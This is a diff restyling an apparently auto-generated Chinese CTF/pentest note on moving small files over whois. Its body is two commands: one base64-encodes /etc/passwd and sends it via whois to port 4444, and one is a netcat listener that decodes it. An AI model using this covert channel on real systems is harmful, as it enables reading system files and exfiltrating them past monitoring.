@@ -1,103 +1,104 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-<meta charset="UTF-8">
-<title>利用Whois传输小文件。</title>
-<meta name="description" content="渗透安全" />
-<meta name="keywords" content="whois 渗透" />
-<style>
-body {
-  font-family: sans-serif;
-  background-color: #fff;
-  color: #333;
-  max-width: 820px;
-  margin: 0 auto;
-  padding: 20px;
-  box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-  transition: background-color 0.3s;
-}
-h1 {
-  font-size: 20px;
-}
-h2 {
-  font-size: 18px;
-}
-h3 {
-  font-size: 16px;
-}
-h4 {
-  font-size: 14px;
-}
-h5 {
-  font-size: 12px;
-}
-h6 {
-  font-size: 11px;
-}
-pre {
-  background-color: #f0f0f0;
-  padding: 10px;
-  border-radius: 5px;
-  overflow-x: auto;
-}
-code {
-  font-family: monospace;
-}
-.hljs {
-  background-color: #f0f0f0;
-  padding: 10px;
-  border-radius: 5px;
-  overflow-x: auto;
-}
-.hljs-keyword {
-  color: #008000;
-}
-.hljs-string {
-  color: #800080;
-}
-.hljs-number {
-  color: #0000ff;
-}
-footer {
-  text-align: center;
-  margin-top: 20px;
-}
-</style>
-<script>
-  // 随机种子
-  Math.seedrandom(199602051111);
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>利用Whois传输小文件。 - CTF - Gemini TextGenerate</title>
+    <meta name="description" content="渗透安全" />
+    <meta name="keywords" content="whois 渗透" />
+    <style>
+        body {
+            background-color: #000000; /* Unix风格 */
+            color: #ffffff;
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            max-width: 820px;
+            margin: 0 auto;
+            box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.2);
+        }
+        h1, h2, h3, h4, h5, h6 {
+            text-align: center;
+            font-weight: normal;
+        }
+        h1 { font-size: 20px; }
+        h2 { font-size: 18px; }
+        h3 { font-size: 16px; }
+        h4 { font-size: 14px; }
+        h5 { font-size: 12px; }
+        h6 { font-size: 11px; }
+        pre {
+            background-color: #222222;
+            padding: 10px;
+            border-radius: 4px;
+            overflow-x: auto;
+            font-family: monospace;
+        }
+        code {
+            background-color: #333333;
+            padding: 2px 4px;
+            border-radius: 4px;
+            font-family: monospace;
+            color: #80ff80; /* 绿色高亮 */
+        }
+        .container {
+            padding: 20px;
+        }
+        footer {
+            text-align: center;
+            padding: 10px 0;
+            font-size: 12px;
+            color: #808080;
+        }
+        a {
+            color: #80ff80; /* 绿色链接 */
+            text-decoration: none;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+    </style>
+    <script>
+        window.onload = function() {
+            // 获取当前时间
+            var now = new Date();
+            var hour = now.getHours();
 
-  // 获取当前时间
-  var now = new Date();
-  var hour = now.getHours();
+            // 判断时间并设置背景色
+            if (hour >= 6 && hour < 18) {
+                document.body.style.backgroundColor = '#ffffff'; // 白天模式
+                document.body.style.color = '#000000';
+            } else {
+                document.body.style.backgroundColor = '#000000'; // 夜晚模式
+                document.body.style.color = '#ffffff';
+            }
 
-  // 判断白天黑夜模式
-  if (hour >= 6 && hour < 18) {
-    document.body.style.backgroundColor = '#fff';
-  } else {
-    document.body.style.backgroundColor = '#222';
-    document.body.style.color = '#eee';
-  }
-
-  // Highlight.js 代码高亮
-  document.addEventListener('DOMContentLoaded', function() {
-    hljs.highlightAll();
-  });
-</script>
+            // 代码高亮
+            var codeBlocks = document.querySelectorAll('pre code');
+            for (var i = 0; i < codeBlocks.length; i++) {
+                codeBlocks[i].style.backgroundColor = '#333333';
+                codeBlocks[i].style.color = '#80ff80';
+            }
+        };
+    </script>
 </head>
 <body>
-<h1>利用Whois传输小文件。</h1>
-<p>渗透安全</p>
+    <div class="container">
+        <h1>利用Whois传输小文件。</h1>
+        <h2>CTF</h2>
+        <h3>2019-09-02 10:03:13 +0800</h3>
+        <p>渗透安全</p>
 
-<pre><code>传输机：
+        <pre><code>传输机：
 root@john:~# whois -h 127.0.0.1 -p 4444 `cat /etc/passwd | base64`
 接受机：
 root@john:/tmp# nc -l -v -p 4444 | sed "s/ //g" | base64 -d
 </code></pre>
 
-<p>转载请注明出处，本文采用 <a href="http://creativecommons.org/licenses/by-nc-nd/4.0/">CC4.0</a> 协议授权</p>
-<footer>
-  Power By Gemini TextGenerate 2024-09-16
-</footer>
+        <p>转载请注明出处，本文采用 <a href="http://creativecommons.org/licenses/by-nc-nd/4.0/">CC4.0</a> 协议授权</p>
+    </div>
+    <footer>
+        Power By Gemini TextGenerate 2024-09-16 22:09:52
+    </footer>
 </body>
 </html>
